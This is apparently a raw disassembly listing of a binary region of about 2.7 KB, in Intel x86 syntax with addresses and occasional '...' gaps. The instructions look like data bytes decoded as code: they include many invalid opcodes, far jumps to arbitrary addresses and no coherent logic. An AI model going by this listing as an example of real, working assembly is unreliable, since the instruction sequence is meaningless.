  4239c0:	mov    esi,0xc7da1206
  4239c5:	mov    bh,0x22
  4239c7:	jmp    0x7e0b:0xfdbe2b60
  4239ce:	shl    DWORD PTR [esi],cl
  4239d0:	(bad)  
  4239d1:	rcl    DWORD PTR [esi],cl
  4239d3:	mov    esp,0xf9ce00b6
  4239d8:	cmp    edx,edx
  4239da:	cmp    BYTE PTR [ebx-0x48],bh
  4239dd:	xor    ah,BYTE PTR [eax-0x34]
  4239e0:	daa    
  4239e1:	leave  
  4239e2:	inc    esp
  4239e3:	int    0xed
  4239e5:	dec    ebx
  4239e6:	sub    eax,0x64ac3816
  4239eb:	imul   esp,ecx,0xd2f34085
  4239f1:	ret    
  4239f2:	pushf  
  4239f3:	xchg   esp,eax
  4239f4:	and    cl,ch
  4239f6:	xor    DWORD PTR [eax-0x66],0x11
  4239fa:	pop    ecx
  4239fb:	inc    ebx
  4239fc:	mov    ebx,0xa6d957d7
  423a01:	jmp    0x5839:0x5c3186ae
  423a08:	mov    ds:0x19fd2fcc,eax
  423a0d:	pop    ebp
  423a0e:	aam    0x83
  423a10:	cli    
  423a11:	in     eax,dx
  423a12:	and    eax,0xf88428cb
  423a17:	push   ds
  423a18:	xchg   DWORD PTR [esi],esp
  423a1a:	aas    
  423a1b:	shl    BYTE PTR [edi],1
  423a1d:	leave  
  423a1e:	test   al,0x13
  423a20:	mov    bh,0xd3
  423a22:	pushf  
  423a23:	aad    0x4
  423a25:	cwde   
  423a26:	enter  0x451b,0xfa
  423a2a:	or     eax,0x7dd24c04
  423a2f:	jns    0x423a7a
  423a31:	or     al,0xe0
  423a33:	fidiv  DWORD PTR [ecx]
  423a35:	cmp    dl,BYTE PTR [ebx-0x2f245b85]
  423a3b:	fstp   QWORD PTR [ebx]
  423a3d:	dec    edx
  423a3e:	ret    
  423a3f:	das    
  423a40:	jmp    0xf037af50
  423a45:	pop    edx
  423a46:	xchg   edi,eax
  423a47:	bnd jbe 0x4239f1
  423a4a:	iret   
  423a4b:	jne    0x423a89
  423a4d:	sub    DWORD PTR [edi+0x1b],eax
  423a50:	das    
  423a51:	mov    WORD PTR [ebx-0x36c4daaf],?
  423a57:	adc    dl,dl
  423a59:	das    
  423a5a:	sub    ebx,DWORD PTR [ecx+0x69b63b29]
  423a60:	cld    
  423a61:	fsub   DWORD PTR [ebx+0x4b110506]
  423a67:	pop    ebp
  423a68:	sbb    eax,ebp
  423a6a:	sbb    BYTE PTR [ebp+edi*8-0xf],cl
  423a6e:	jge    0x423ae9
  423a70:	jle    0x423a3e
  423a72:	push   edx
  423a73:	dec    esi
  423a74:	bound  edi,QWORD PTR [edi]
  423a76:	fwait
  423a77:	inc    esi
  423a78:	push   0x1efe50c7
  423a7d:	fiadd  WORD PTR [esi+0x61]
  423a80:	pmulhw mm4,QWORD PTR [edi-0x44]
  423a84:	pop    es
  423a85:	ja     0x423a8d
  423a87:	iret   
  423a88:	fiadd  WORD PTR [ebp+0x109e2311]
  423a8e:	adc    cl,bl
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	stc    
  423b01:	jle    0x423b6d
  423b03:	mov    eax,ds:0x17c7c
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	pop    ecx
  423b0d:	xor    dh,BYTE PTR [ebx]
  423b0f:	push   ebx
  423b10:	mov    WORD PTR [ecx],fs
  423b12:	push   0x7d
  423b14:	repz dec esi
  423b16:	mov    BYTE PTR [edx+0x7a],bh
  423b19:	ret    
  423b1a:	adc    BYTE PTR [ecx-0x79],0xaa
  423b1e:	jb     0x423b12
  423b20:	out    dx,al
  423b21:	daa    
  423b22:	shr    ecx,cl
  423b24:	lock xchg BYTE PTR [eax],ah
  423b27:	sbb    eax,0xc055b255
  423b2c:	jmp    0xe5718b2c
  423b31:	jp     0x423b94
  423b33:	jnp    0x423b1d
  423b35:	(bad)  
  423b36:	call   0x77f94a3a
  423b3b:	xchg   dl,ch
  423b3d:	xlat   BYTE PTR ds:[ebx]
  423b3e:	xchg   esp,eax
  423b3f:	sbb    ch,BYTE PTR [edx+0x23b1fe4d]
  423b45:	inc    ebx
  423b46:	add    eax,0xa4a3b44
  423b4b:	and    al,0xb6
  423b4d:	lock mov es,WORD PTR [edx+ebx*2+0x7eca87fd]
  423b55:	jl     0x423b98
  423b57:	fstp   QWORD PTR [edi-0x58e0095a]
  423b5d:	ins    DWORD PTR es:[edi],dx
  423b5e:	inc    eax
  423b5f:	and    edx,edx
  423b61:	cmp    DWORD PTR [ebx],ecx
  423b63:	mov    al,ds:0xcd77ac4d
  423b68:	push   ss
  423b69:	fsin   
  423b6b:	mov    ecx,0x9bb3cd1e
  423b70:	inc    ebp
  423b71:	aad    0x30
  423b73:	hlt    
  423b74:	fwait
  423b75:	sti    
  423b76:	test   al,0x5
  423b78:	xchg   ecx,eax
  423b79:	xlat   BYTE PTR ds:[ebx]
  423b7a:	mov    bh,0x22
  423b7c:	loop   0x423be1
  423b7e:	lods   al,BYTE PTR ds:[esi]
  423b7f:	stos   DWORD PTR es:[edi],eax
  423b80:	xor    ebp,0xffffffe5
  423b83:	ret    
  423b84:	push   ebx
  423b85:	ja     0x423b6f
  423b87:	xchg   edi,eax
  423b88:	sub    BYTE PTR [eax-0x459eb7c8],bh
  423b8e:	jne    0x423b1a
  423b90:	xchg   esp,eax
  423b91:	xor    ebx,DWORD PTR ds:0xc7a471a5
  423b97:	pushf  
  423b98:	pop    ecx
  423b99:	mov    esi,0x80cccc0b
  423b9e:	sbb    DWORD PTR [ecx+0x4efe70d2],ecx
  423ba4:	jnp    0x423bdf
  423ba6:	loopne 0x423bec
  423ba8:	cmc    
  423ba9:	sub    al,0x95
  423bab:	push   ds
  423bac:	cmp    DWORD PTR [eax+0x45],edi
  423baf:	or     ecx,edx
  423bb1:	es pop esp
  423bb3:	jns    0x423b7b
  423bb5:	xchg   ebx,eax
  423bb6:	mov    ecx,0x23933ba2
  423bbb:	lea    edx,[ebx+eax*2-0x7ab8dbf6]
  423bc2:	mov    ds:0x1968cd5d,eax
  423bc7:	mov    al,ds:0xed4832ae
  423bcc:	jg     0x423c4b
  423bce:	int    0xb9
  423bd0:	in     al,0xd1
  423bd2:	xor    DWORD PTR [edx+0x2b],esi
  423bd5:	push   es
  423bd6:	mov    dl,BYTE PTR [edi]
  423bd8:	jns    0x423c08
  423bda:	xchg   ecx,eax
  423bdb:	jmp    0x74f4ebd4
  423be0:	push   ecx
  423be1:	in     al,0x77
  423be3:	and    DWORD PTR [esi+0x62],0xd9723e9e
  423bea:	cmp    eax,0xe4c66275
  423bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bf0:	add    ah,BYTE PTR [ebx-0x940c20d]
  423bf6:	repz fdiv DWORD PTR [ecx+0x526fa088]
  423bfd:	out    dx,eax
  423bfe:	into   
  423bff:	mov    cl,0xcd
  423c01:	jbe    0x423c3e
  423c03:	adc    ah,ch
  423c05:	or     al,BYTE PTR [ebp+0x50]
  423c08:	add    esi,edi
  423c0a:	mov    ch,0x86
  423c0c:	inc    ebx
  423c0d:	or     al,0xfb
  423c0f:	test   eax,0x0
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x42446617]
  423c81:	dec    esp
  423c82:	ret    
  423c83:	imul   eax,DWORD PTR [eax+0x400017d],0x9000001
  423c8d:	add    DWORD PTR [ebp-0x26],0xd964ced0
  423c94:	shl    DWORD PTR [esi+0x3949e356],1
  423c9a:	sub    eax,ebp
  423c9c:	pop    es
  423c9d:	and    edx,DWORD PTR [esi-0x1d]
  423ca0:	add    cl,BYTE PTR [edi]
  423ca2:	ret    
  423ca3:	fwait
  423ca4:	adc    bl,BYTE PTR [esi-0x19]
  423ca7:	sub    DWORD PTR [esi],esi
  423ca9:	in     al,0x1e
  423cab:	jo     0x423c30
  423cad:	mov    al,ds:0x90993945
  423cb2:	fistp  QWORD PTR [eax-0x7dab1471]
  423cb8:	in     eax,dx
  423cb9:	pop    eax
  423cba:	xchg   edi,eax
  423cbb:	outs   dx,DWORD PTR ds:[esi]
  423cbc:	lods   al,BYTE PTR ds:[esi]
  423cbd:	imul   esp,DWORD PTR [eax],0x78
  423cc0:	sub    al,0xdd
  423cc2:	pop    edx
  423cc3:	push   esp
  423cc4:	arpl   di,dx
  423cc6:	lea    edi,[ebx-0x17bec077]
  423ccc:	std    
  423ccd:	scas   al,BYTE PTR es:[edi]
  423cce:	xchg   esi,eax
  423ccf:	jmp    0xaac2:0x5798de4f
  423cd6:	jae    0x423d10
  423cd8:	push   esi
  423cd9:	scas   eax,DWORD PTR es:[edi]
  423cda:	jmp    0x1336:0x9273ad1a
  423ce1:	enter  0x4b0c,0x9f
  423ce5:	daa    
  423ce6:	mov    edi,0xf031d3b1
  423ceb:	add    BYTE PTR [esi+0x258a543],dh
  423cf1:	push   cs
  423cf2:	mov    ?,WORD PTR [ecx]
  423cf4:	shr    bl,1
  423cf6:	add    eax,0x9bc84d81
  423cfb:	jl     0x423d31
  423cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cfe:	and    eax,0x44ad089c
  423d03:	ins    DWORD PTR es:[edi],dx
  423d04:	cmc    
  423d05:	xor    DWORD PTR [esi+0x5cc19c30],esi
  423d0b:	es repz mov ebp,0x5de8cf66
  423d12:	add    ah,BYTE PTR ds:0xf61cb8a5
  423d18:	push   ecx
  423d19:	mov    al,ss:0xdcbbbc30
  423d1f:	or     BYTE PTR [ebx-0x6509c2f0],0xad
  423d26:	out    0xd8,al
  423d28:	test   BYTE PTR [ecx+0x6b],0x39
  423d2c:	aas    
  423d2d:	mul    edx
  423d2f:	aaa    
  423d30:	aas    
  423d31:	xchg   DWORD PTR [esi-0x32],esi
  423d34:	dec    ebx
  423d35:	sti    
  423d36:	push   ebp
  423d37:	int3   
  423d38:	xchg   BYTE PTR [edx+0x2a0acd75],cl
  423d3e:	sub    al,BYTE PTR [ecx-0x3f]
  423d41:	scas   eax,DWORD PTR es:[edi]
  423d42:	ins    DWORD PTR es:[edi],dx
  423d43:	(bad)  
  423d44:	std    
  423d45:	ins    DWORD PTR es:[edi],dx
  423d46:	and    edi,esi
  423d48:	pop    ss
  423d49:	in     al,dx
  423d4a:	inc    eax
  423d4b:	daa    
  423d4c:	add    ch,BYTE PTR [edi-0x4519696a]
  423d52:	cmp    edx,ebx
  423d54:	xchg   edx,eax
  423d55:	pop    esi
  423d56:	in     al,0x6a
  423d58:	inc    ecx
  423d59:	mov    esi,0xae7a6a9b
  423d5e:	nop
  423d5f:	shr    DWORD PTR [ecx-0x3],1
  423d62:	add    al,BYTE PTR [ebp+ecx*8-0x5d9ee58b]
  423d69:	retf   0x209f
  423d6c:	fcmovne st,st(0)
  423d6e:	jmp    0x423d70
  423d70:	mov    ebx,0x5e7b12eb
  423d75:	push   ebx
  423d76:	and    eax,0x32eda653
  423d7b:	jmp    0x423dfa
  423d7d:	push   esp
  423d7e:	xchg   esi,eax
  423d7f:	pop    edi
  423d80:	jmp    0x5606a9fe
  423d85:	sub    eax,0x89cd3589
  423d8a:	call   0x8:0x2d2a60f6
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x60e3ded2],esp
  423e03:	in     eax,dx
  423e04:	test   BYTE PTR [esi+0x1],bh
  423e07:	add    BYTE PTR [ecx+eax*1],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	jnp    0x423e79
  423e0e:	push   esi
  423e0f:	adc    BYTE PTR [edx+0x7d3b7a66],dl
  423e15:	mov    dh,0x61
  423e17:	mov    esp,esi
  423e19:	xchg   edx,eax
  423e1a:	nop
  423e1b:	cmp    eax,0xb8bd71f6
  423e20:	xor    ecx,ebp
  423e22:	jb     0x423df4
  423e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e25:	les    edx,FWORD PTR [edx+0x57]
  423e28:	xchg   esp,eax
  423e29:	arpl   WORD PTR [ebp+0x74],sp
  423e2c:	aam    0x93
  423e2e:	pusha  
  423e2f:	and    eax,ebx
  423e31:	xchg   DWORD PTR [ecx+ecx*8-0x18],edi
  423e35:	adc    bh,bh
  423e37:	xor    bh,bl
  423e39:	inc    BYTE PTR [esi-0x3534ae46]
  423e3f:	and    al,0xdc
  423e41:	inc    eax
  423e42:	mov    ebx,?
  423e44:	push   es
  423e45:	mov    al,ah
  423e47:	leave  
  423e48:	(bad)  
  423e49:	or     eax,0xb72208ff
  423e4e:	out    0xe,eax
  423e50:	out    0xb8,eax
  423e52:	inc    esi
  423e53:	push   edi
  423e54:	push   cs
  423e55:	sbb    esp,DWORD PTR [ebx+0x3]
  423e58:	push   ss
  423e59:	ret    
  423e5a:	adc    DWORD PTR [edx+0x2f],ebp
  423e5d:	push   eax
  423e5e:	inc    edx
  423e5f:	repz pop edx
  423e61:	add    eax,0x321036d2
  423e66:	fsub   st(6),st
  423e68:	or     BYTE PTR [esi],ch
  423e6a:	sbb    eax,0x48194e94
  423e6f:	cmp    ebx,ebx
  423e71:	(bad)  
  423e73:	ins    BYTE PTR es:[edi],dx
  423e74:	repz les eax,FWORD PTR [edx+0x60e31274]
  423e7b:	pop    ss
  423e7c:	lea    eax,[edi+0x52]
  423e7f:	cmp    dl,bh
  423e81:	lods   al,BYTE PTR ds:[esi]
  423e82:	mov    dl,0x73
  423e84:	inc    eax
  423e85:	jbe    0x423e63
  423e87:	pop    eax
  423e88:	repnz call 0xad66:0xab618092
  423e90:	mov    edx,0x3056a47b
  423e95:	or     BYTE PTR [ebx-0x4a],ah
  423e98:	cmp    DWORD PTR [eax],esp
  423e9a:	in     eax,dx
  423e9b:	adc    ebx,eax
  423e9d:	push   ss
  423e9e:	je     0x423eb6
  423ea0:	sub    bl,BYTE PTR [eax-0x36]
  423ea3:	pop    esi
  423ea4:	loope  0x423f16
  423ea6:	aas    
  423ea7:	jb     0x423e57
  423ea9:	lods   al,BYTE PTR ds:[esi]
  423eaa:	sar    BYTE PTR [esi+ecx*2-0x76f1cb59],cl
  423eb1:	xchg   esi,eax
  423eb2:	jmp    0x423efd
  423eb4:	xor    BYTE PTR [esi+edx*4-0x6b],ch
  423eb8:	mov    ss,WORD PTR [esi]
  423eba:	mov    esi,0x8f74ef55
  423ebf:	out    dx,eax
  423ec0:	cmp    DWORD PTR [edi+0x76],0x14
  423ec4:	shl    BYTE PTR [eax-0xcae7d57],1
  423eca:	pop    edi
  423ecb:	rol    BYTE PTR [edi+0x77],1
  423ece:	(bad)  
  423ed0:	(bad)
  423ed3:	clc    
  423ed4:	inc    ebp
  423ed5:	retf   0xaa3f
  423ed8:	push   ss
  423ed9:	inc    esi
  423eda:	dec    edi
  423edb:	std    
  423edc:	adc    ebx,esp
  423ede:	push   edx
  423edf:	sub    al,0x8d
  423ee1:	fdiv   QWORD PTR [edi]
  423ee3:	outs   dx,BYTE PTR ds:[esi]
  423ee4:	ret    
  423ee5:	lds    edi,FWORD PTR [ebp-0x7a]
  423ee8:	push   0x8
  423eea:	adc    eax,0x432615fb
  423eef:	fwait
  423ef0:	jecxz  0x423eff
  423ef2:	les    edi,FWORD PTR [ebx]
  423ef4:	call   0xc928:0x5feca4e2
  423efb:	leave  
  423efc:	imul   ebp,DWORD PTR [eax-0x4dc46830],0xffffffcc
  423f03:	mov    bl,0x62
  423f05:	adc    eax,0x395a1eba
  423f0a:	dec    ebx
  423f0b:	int    0xea
  423f0d:	imul   edi,DWORD PTR ds:0xb0,0x0
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	fild   DWORD PTR [edi]
  423f82:	push   ss
  423f83:	pop    ecx
  423f84:	mov    BYTE PTR [edi+0x1],bh
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	call   0x140e7a09
  423f91:	shr    BYTE PTR [edi-0x1198986b],0x5a
  423f98:	sub    edi,ebp
  423f9a:	das    
  423f9b:	mov    dl,0xa8
  423f9d:	xor    cl,bh
  423f9f:	sbb    BYTE PTR [eax+0x2c424137],0xa4
  423fa6:	out    dx,eax
  423fa7:	hlt    
  423fa8:	cmc    
  423fa9:	inc    esi
  423faa:	ja     0x423ff6
  423fac:	retf   0x5ab9
  423faf:	test   DWORD PTR [edx+eax*4-0x4e],edx
  423fb3:	aam    0x36
  423fb5:	cmp    eax,0x77d44650
  423fba:	pop    edi
  423fbb:	sbb    eax,0x2f860f00
  423fc0:	jbe    0x424013
  423fc2:	pop    ebx
  423fc3:	in     eax,dx
  423fc4:	jl     0x424017
  423fc6:	mov    ebp,0xa8adcbd8
  423fcb:	inc    edx
  423fcc:	push   ebx
  423fcd:	sbb    al,0xb2
  423fcf:	pop    es
  423fd0:	out    0xd2,al
  423fd2:	fisub  DWORD PTR [eax]
  423fd4:	sar    BYTE PTR ds:0x98e4648b,1
  423fda:	xor    DWORD PTR [ebp+ebx*4-0x4a0f0464],ecx
  423fe1:	leave  
  423fe2:	js     0x424039
  423fe4:	inc    edx
  423fe5:	fdiv   st,st(5)
  423fe7:	ja     0x423f98
  423fe9:	adc    dh,BYTE PTR [esi+edx*8]
  423fec:	call   0x10ba0d6d
  423ff1:	ins    BYTE PTR es:[edi],dx
  423ff2:	adc    al,0xd8
  423ff4:	rcl    DWORD PTR [ecx+0x1667b68f],1
  423ffa:	scas   al,BYTE PTR es:[edi]
  423ffb:	mov    eax,ds:0xaa18bd65
  424000:	mov    ah,0xf3
  424002:	int3   
  424003:	jae    0x424040
  424005:	test   DWORD PTR [ebx+0x7d17b7d8],esi
  42400b:	dec    ecx
  42400c:	call   FWORD PTR [esi]
  42400e:	imul   esi,DWORD PTR [esi],0x271a386b
  424014:	push   edx
  424015:	sbb    eax,0x77efaf65
  42401a:	mov    eax,ds:0xe5524ba4
  42401f:	pop    esi
  424020:	nop
  424021:	(bad)  
  424022:	pop    ecx
  424023:	fcomp  st(1)
  424025:	xor    al,0x80
  424027:	push   cs
  424028:	sub    DWORD PTR [edx+0x2f],ebx
  42402b:	ror    BYTE PTR [ebp+0x56],1
  42402e:	or     ecx,edi
  424030:	popa   
  424031:	push   esi
  424032:	sub    ecx,ebp
  424034:	xlat   BYTE PTR ds:[ebx]
  424035:	pop    edi
  424036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424037:	pop    ebx
  424038:	ss sbb al,0x59
  42403b:	jmp    0x424039
  42403d:	mov    edx,0xc741f743
  424042:	mov    ecx,0xaec58dce
  424047:	fistp  DWORD PTR [eax+ebp*2-0xbdee5a0]
  42404e:	ficom  DWORD PTR [edx]
  424050:	lea    eax,[esi+0x4bac8d30]
  424056:	repnz inc ebp
  424058:	(bad)  
  424059:	cld    
  42405a:	inc    edi
  42405b:	xchg   esp,eax
  42405c:	mov    cl,0xf0
  42405e:	ret    
  42405f:	in     al,dx
  424060:	pop    esp
  424061:	xchg   esp,eax
  424062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424063:	mov    ss,WORD PTR [edx]
  424065:	(bad)  
  424066:	std    
  424067:	rcl    BYTE PTR [eax+0x4],0xee
  42406b:	add    eax,0xd5e80e1e
  424070:	int    0x39
  424072:	or     dl,BYTE PTR [eax+0x47b377eb]
  424078:	jmp    0x4240e4
  42407a:	inc    edi
  42407b:	push   es
  42407c:	stos   DWORD PTR es:[edi],eax
  42407d:	cli    
  42407e:	pop    ds
  42407f:	push   cs
  424080:	and    BYTE PTR [edi],cl
  424082:	mov    eax,ds:0xb79b7dd2
  424087:	addr16 test al,0xef
  42408a:	cld    
  42408b:	mov    esi,0x5c56db93
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	adc    al,0xf0
  424102:	(bad)  
  424103:	xor    BYTE PTR [eax+eax*4+0x1040001],cl
  42410a:	add    BYTE PTR [eax],al
  42410c:	xlat   BYTE PTR ds:[ebx]
  42410d:	push   ebp
  42410e:	or     al,0x82
  424110:	xchg   esi,eax
  424111:	xchg   ebx,eax
  424112:	stos   DWORD PTR es:[edi],eax
  424113:	gs daa 
  424115:	push   edx
  424116:	or     eax,esp
  424118:	and    BYTE PTR [ebp-0x200c374e],al
  42411e:	loope  0x424117
  424120:	xor    edx,DWORD PTR [ebp-0x3abbb88e]
  424126:	(bad)  
  424127:	sbb    dl,dl
  424129:	loope  0x424150
  42412b:	jl     0x4240f5
  42412d:	pop    ds
  42412e:	pushf  
  42412f:	sbb    BYTE PTR [esi+ecx*4],ch
  424132:	repz pop eax
  424134:	dec    ebx
  424135:	fnstcw WORD PTR [esi]
  424137:	and    eax,0x396a9a9c
  42413c:	sub    ebp,edi
  42413e:	and    eax,0xceaa5679
  424143:	xor    ah,bl
  424145:	fcomp  st(3)
  424147:	sub    eax,0x3d165b3a
  42414c:	and    BYTE PTR [edi+0x49],ch
  42414f:	ins    BYTE PTR es:[edi],dx
  424150:	jo     0x42414f
  424152:	dec    ecx
  424153:	cmp    ebx,edi
  424155:	mov    ebp,0x4e2d5c84
  42415a:	cs pop es
  42415c:	loopne 0x4240f8
  42415e:	test   BYTE PTR [ebx+0x5570d727],ch
  424164:	sbb    al,0xeb
  424166:	cmc    
  424167:	cmp    eax,0x761a6bb6
  42416c:	mov    bl,0x9a
  42416e:	scas   al,BYTE PTR es:[edi]
  42416f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424170:	mov    esp,0x6c0af58c
  424175:	lea    esp,[edx+0xa7152ba]
  42417b:	dec    esi
  42417c:	push   esi
  42417d:	ficom  WORD PTR [ebp-0x103d02c]
  424183:	xchg   edx,eax
  424184:	mov    ebx,0x20bc6c5b
  424189:	pop    esp
  42418a:	pop    es
  42418b:	outs   dx,BYTE PTR ds:[esi]
  42418c:	retf   0x44ac
  42418f:	jo     0x424150
  424191:	test   eax,0xe8c189bd
  424196:	xor    al,0x92
  424198:	retf   0x821a
  42419b:	cs int3 
  42419d:	rcr    DWORD PTR [ebx-0x4f],1
  4241a0:	dec    esp
  4241a1:	outs   dx,DWORD PTR ds:[esi]
  4241a2:	in     eax,dx
  4241a3:	xchg   esi,eax
  4241a4:	mov    ecx,0x925ce674
  4241a9:	nop
  4241aa:	push   ds
  4241ab:	test   BYTE PTR [ecx],0x2
  4241ae:	add    ebx,ebx
  4241b0:	mov    bl,0xe8
  4241b2:	pop    ds
  4241b3:	push   ebx
  4241b4:	repnz inc eax
  4241b6:	adc    al,bh
  4241b8:	push   ebp
  4241b9:	leave  
  4241ba:	retf   0xc8cc
  4241bd:	ins    DWORD PTR es:[edi],dx
  4241be:	dec    edi
  4241bf:	repnz and ah,0x7e
  4241c3:	adc    eax,0x5f1da86a
  4241c8:	mov    dh,0xd3
  4241ca:	inc    esp
  4241cb:	push   edx
  4241cc:	rcl    DWORD PTR [ebx],1
  4241ce:	ja     0x424153
  4241d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241d1:	icebp  
  4241d2:	or     bh,bh
  4241d4:	pushf  
  4241d5:	pushf  
  4241d6:	add    eax,0x86622e99
  4241db:	cmp    al,0xc3
  4241dd:	sti    
  4241de:	push   0x2f210c58
  4241e3:	mov    al,ds:0x9622c5bd
  4241e8:	push   ebp
  4241e9:	jnp    0x4241b7
  4241eb:	int    0x44
  4241ed:	test   bh,al
  4241ef:	and    al,0x1c
  4241f1:	in     eax,dx
  4241f2:	xlat   BYTE PTR ds:[ebx]
  4241f3:	inc    esi
  4241f4:	dec    edi
  4241f5:	and    bl,BYTE PTR [eax]
  4241f7:	or     BYTE PTR [ebx-0x4ec858bc],cl
  4241fd:	ins    DWORD PTR es:[edi],dx
  4241fe:	mov    dh,0x68
  424200:	xchg   esi,eax
  424201:	in     eax,dx
  424202:	(bad)  
  424203:	in     al,0xb3
  424205:	enter  0x7ea0,0x20
  424209:	xor    BYTE PTR [edx+0x30208a40],ch
  42420f:	and    eax,0x0
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	add    eax,0x9059fb5c
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [eax+0xb],ah
  42428e:	mov    bh,0x31
  424290:	test   DWORD PTR [ecx-0x67],ebx
  424293:	pusha  
  424294:	scas   al,BYTE PTR es:[edi]
  424295:	push   edx
  424296:	(bad)  
  424297:	mov    al,ds:0xbf0012b8
  42429c:	les    edx,FWORD PTR [ecx+0x4e95ffd4]
  4242a2:	or     ah,bl
  4242a4:	jmp    0x91b3f4f5
  4242a9:	and    BYTE PTR [ebp+0x619ff599],0xb1
  4242b0:	cmp    DWORD PTR [ebx],0xffffffb5
  4242b3:	pop    es
  4242b4:	ins    DWORD PTR es:[edi],dx
  4242b5:	and    eax,0xbf45bf67
  4242ba:	mov    ah,bh
  4242bc:	fwait
  4242bd:	pusha  
  4242be:	mov    dl,0x7b
  4242c0:	leave  
  4242c1:	push   edx
  4242c2:	adc    BYTE PTR [ebp+0x1e],dl
  4242c5:	sub    bh,BYTE PTR [esi+ebp*4-0x6d]
  4242c9:	cmp    al,ch
  4242cb:	scas   al,BYTE PTR es:[edi]
  4242cc:	sub    eax,0x859dce04
  4242d1:	xlat   BYTE PTR ds:[ebx]
  4242d2:	retf   
  4242d3:	or     bx,WORD PTR [edi]
  4242d6:	add    eax,0x61cccfea
  4242db:	out    0xda,eax
  4242dd:	mov    esp,0x614fdf9d
  4242e2:	popa   
  4242e3:	inc    ebp
  4242e4:	xchg   edx,eax
  4242e5:	rcr    bl,1
  4242e7:	pop    edi
  4242e8:	push   edi
  4242e9:	push   ebx
  4242ea:	fadd   DWORD PTR [esi-0x1c0845d4]
  4242f0:	js     0x42429d
  4242f2:	stos   BYTE PTR es:[edi],al
  4242f3:	push   ebx
  4242f4:	hlt    
  4242f5:	jno    0x42434e
  4242f7:	sub    BYTE PTR [edi-0x343ae231],ch
  4242fd:	enter  0x24f5,0x29
  424301:	test   al,0xb3
  424303:	out    0x47,eax
  424305:	ds cdq 
  424307:	push   0x3a
  424309:	gs stos DWORD PTR es:[edi],eax
  42430b:	sti    
  42430c:	push   cs
  42430d:	sub    dl,BYTE PTR [edx]
  42430f:	fs or  al,0x59
  424312:	cmp    ch,al
  424314:	(bad)  
  424315:	jg     0x4242c7
  424317:	mov    esi,0x2819b414
  42431c:	test   BYTE PTR [esi+edx*4+0x12968735],0xf7
  424324:	sbb    DWORD PTR [edi+0x346aff6a],0xffffffb1
  42432b:	jns    0x4242f5
  42432d:	add    al,0x48
  42432f:	inc    esi
  424330:	shl    BYTE PTR [esi+edx*8+0x11],cl
  424334:	das    
  424335:	mov    bl,0xb0
  424337:	mov    dl,0xd4
  424339:	push   esp
  42433a:	lods   al,BYTE PTR ds:[esi]
  42433b:	ret    0xab07
  42433e:	ss pop ss
  424340:	mov    esi,0x32dc804a
  424345:	mov    eax,0x390e5850
  42434a:	sti    
  42434b:	lock push ss
  42434d:	sbb    esi,DWORD PTR [ebp-0x6d]
  424350:	dec    ecx
  424351:	out    0xe2,eax
  424353:	fwait
  424354:	bound  esp,QWORD PTR [edx+0x6d800458]
  42435a:	sbb    BYTE PTR gs:[ebx-0x45],bh
  42435e:	mov    DWORD PTR [ebp+0x52e2ca9f],ebx
  424364:	fild   WORD PTR [ebp+ecx*2-0x6299093e]
  42436b:	pop    ebx
  42436c:	lock xchg ecx,eax
  42436e:	test   BYTE PTR [ecx+ebx*1-0x2],0xd3
  424373:	ja     0x4243dc
  424375:	cmp    ch,BYTE PTR [edi+0x68396d4a]
  42437b:	lahf   
  42437c:	xchg   esp,eax
  42437d:	pushf  
  42437e:	in     eax,dx
  42437f:	call   0x30c548ec
  424384:	cmp    BYTE PTR [edi+ebx*1],bl
  424387:	or     esp,eax
  424389:	pop    esp
  42438a:	not    ch
  42438c:	jbe    0x4243b4
  42438e:	into   
  42438f:	mov    edi,0x0
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42441f
  424401:	dec    esp
  424402:	pop    ss
  424403:	retf   0x8294
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	xor    dl,BYTE PTR ds:[ecx]
  42440f:	clc    
  424410:	repz jle 0x424465
  424413:	mov    ebp,0x7d8f607b
  424418:	sahf   
  424419:	andnps xmm2,xmm4
  42441c:	(bad)  
  42441d:	repnz call 0x66be:0xca2d43e9
  424425:	ds jbe 0x42440e
  424428:	jp     0x42447a
  42442a:	fimul  WORD PTR [esi]
  42442c:	lea    edi,[ebp-0x68274389]
  424432:	addr16 fs stc 
  424435:	retf   0x8b4c
  424438:	fldenv [ecx+0x25cfa3a5]
  42443e:	cmp    al,0x5e
  424440:	sub    eax,0xd0e247de
  424445:	cs or  edx,ecx
  424448:	mov    dl,0x8d
  42444a:	xchg   BYTE PTR [ebx],al
  42444c:	pop    ss
  42444d:	jno    0x424464
  42444f:	neg    DWORD PTR [edx+0x1a2fcaf9]
  424455:	cs xchg edx,eax
